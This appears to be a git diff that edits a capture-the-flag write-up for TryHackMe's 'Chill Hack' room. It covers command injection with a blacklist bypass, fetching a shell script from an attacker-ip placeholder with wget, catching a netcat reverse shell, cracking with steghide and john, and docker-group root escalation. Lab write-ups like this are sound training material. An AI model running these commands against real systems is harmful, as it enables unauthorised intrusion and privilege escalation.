@@ -5,6 +5,9 @@ author: Marcus Loeper
 
 # THM - Chill Hack
 
+![image](/images/Pasted image 20221023210259.png)
+[Try Hack Me - Chill Hack](https://tryhackme.com/room/chillhack)
+
 ## Enumeration
 
 ### nmap scan
@@ -21,12 +24,16 @@ PORT   STATE SERVICE
 80/tcp open  http
 ```
 
-![[Pasted image 20221017221742.png]]
+i found 3 open ports. lets see what the website is all about.
+
+![image](/images/Pasted image 20221017221742.png)
+
+nothing special. lets see if we find any directories.
 
 ### Dirbusting with ffuf
 
 ```shell
-─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://chillhack.thm/FUZZ
+$ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://chillhack.thm/FUZZ
 
         /'___\  /'___\           /'___\
        /\ \__/ /\ \__/  __  __  /\ \__/
@@ -63,27 +70,27 @@ server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration:
 
 after dirbusting with ffuf one directory got my attention. `secret`
 
-![[Pasted image 20221017222347.png]]
+![image](/images/Pasted image 20221017222347.png)
 
 just a site with an input field and one button.
-i try common commands like `whoami`
+i tried `whoami` and got a positive answer.
 
-![[Pasted image 20221017222519.png]]
+![image](/images/Pasted image 20221017222519.png)
 
-and we know who we are. but a few commands are black listed:
+but a some commands are blacklisted.
 
-![[Pasted image 20221017222613.png]]
+![image](/images/Pasted image 20221017222613.png)
 
 I tried different commands to view the contents of a file and in the end `nl` was one that worked.
 
 because `ls` is not working i used `find` to look for files.
 
-![[Pasted image 20221017223746.png]]
+![image](/images/Pasted image 20221017223746.png)
 
 but i could not read the `local.txt`. bash was of course black listed too and other tools like python also. i wanted to spawn a reverse shell and luckily i could use `wget` to download the shell script to the victim. i also moved to `curl` for faster iteration.
 
 ```shell
-└─$ curl -L -d "command=wget --version" http://chillhack.thm/secret/
+$ curl -L -d "command=wget --version" http://chillhack.thm/secret/
 <html>
 <body>
 
@@ -112,29 +119,29 @@ but i could not read the `local.txt`. bash was of course black listed too and ot
 
 ## reverse shell
 
-on my machine i started a websever.
+on my machine i started a webserver,
 
 ```shell
-└─$ python3 -m http.server 80
+$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-and download on the victim.
+and download the shell on the victim.
 
 ```shell
-└─$ curl -L -d "command=wget -O /tmp/shell.sh http://<attacker-ip>/shell.sh" http://chillhack.thm/secret/
+$ curl -L -d "command=wget -O /tmp/shell.sh http://<attacker-ip>/shell.sh" http://chillhack.thm/secret/
 ```
 
-setting the the permissions numeric because `+x` was not working.
+i had so set the the permissions numeric because `+x` was not working.
 
 ```shell
-└─$ curl -L -d "command=chmod 777 /tmp/shell.sh" http://chillhack.thm/secret/
+$ curl -L -d "command=chmod 777 /tmp/shell.sh" http://chillhack.thm/secret/
 ```
 
-as `ls` is not working i checked the permissions via the `stat` which was not filtered.
+the i double checked the permissions via the `stat` which was not filtered.
 
 ```shell
-└─$ curl -L -d "command=stat -c %A /tmp/shell.sh" http://chillhack.thm/secret/
+$ curl -L -d "command=stat -c %A /tmp/shell.sh" http://chillhack.thm/secret/
 
 <h2 style="color:blue;">-rwxrwxrwx
 ```
@@ -142,11 +149,11 @@ as `ls` is not working i checked the permissions via the `stat` which was not fi
 i launched the script and got a reverse shell on my kali box.
 
 ```shell
-└─$ curl -L -d "command=/tmp/shell.sh" http://chillhack.thm/secret/
+$ curl -L -d "command=/tmp/shell.sh" http://chillhack.thm/secret/
 ```
 
 ```shell
-└─$ nc -lvnp 4444
+$ nc -lvnp 4444
 listening on [any] 4444 ...
 connect to [10.11.1.199] from (UNKNOWN) [10.10.55.124] 54700
 bash: cannot set terminal process group (1066): Inappropriate ioctl for device
@@ -167,7 +174,7 @@ stty raw -echo; fg
 
 ## getting first user and user flag
 
-typing `sudo -l` gave this output.
+to get the user flag i started with `sudo -l`.
 
 ```shell
 www-data@ubuntu:/var/www$ sudo -l
@@ -181,7 +188,6 @@ User www-data may run the following commands on ubuntu:
 ```
 
 we can execute a script as the user `apaar`
-
 the content of the script:
 
 ```bash
@@ -218,7 +224,7 @@ apaar
 
 after stabilizing the shell i got the first flag.
 
-![[Pasted image 20221019091841.png]]
+![image](/images/Pasted image 20221019091841.png)
 
 ## further enumeration
 
@@ -274,45 +280,44 @@ i downloaded the image via `python3 -m http.server 8000`
 then i ran a few steg tools. in the end steghide was successful.
 
 ```shell
-┌──(j0j0pupp3㉿bAs3)-[~/THM/chillhack]
-└─$ steghide extract -sf hacker-with-laptop_23-2147985341.jpg
+$ steghide extract -sf hacker-with-laptop_23-2147985341.jpg
 Enter passphrase:
 wrote extracted data to "backup.zip".
 ```
 
-the zip needed a password:
+the zip needed a password.
 
 ```shell
-└─$ unzip backup.zip
+$ unzip backup.zip
 Archive:  backup.zip
 [backup.zip] source_code.php password:
 ```
 
-`john` came again to the rescue.
+and `john` came again to the rescue.
 
 ```shell
-└─$ zip2john backup.zip > backup_zip_hash.txt
+$ zip2john backup.zip > backup_zip_hash.txt
 
-└─$ john --wordlist=/usr/share/wordlists/rockyou.txt backup_zip_hash.txt
+$ john --wordlist=/usr/share/wordlists/rockyou.txt backup_zip_hash.txt
 ```
 
 ## getting second user login
 
-the password worked and we got a new file `source-code.php`
-in this file is a base64 encoded password.
+the password worked and i got a new file `source-code.php`
+in this file i found a base64 encoded password.
 
 ```php
 password = $_POST["password"];
                 if(base64_encode($password) == "IWQwbn************NzdzByZA==")
 ```
 
-decoding with
+decoding with:
 
 ```shell
 echo -n "IWQwbn************NzdzByZA==" | base64 -d
 ```
 
-and for which account we can see a few lines further down.
+and for which account i could see a few lines further down.
 
 ```php
 {
@@ -321,8 +326,8 @@ and for which account we can see a few lines further down.
 }
 ```
 
-using these creds we got a new login.
-this user is memeber of the `docker` group. with this info we can exploit this like this.
+using these credentials i got a new login.
+this user is a member of the `docker` group. with this info i escalate my privileges like this.
 
 ## root access
 
@@ -344,9 +349,9 @@ dev home media opt root sbin sys usr
 / # cd mnt
 /mnt # ls
 proof.txt
-/mnt # cat proof.txt
+/mnt # cat proof.txt 
 ```
 
 and here is the root flag.
 
-![[Pasted image 20221019094035.png]]
+![image](/images/Pasted image 20221019094035.png)
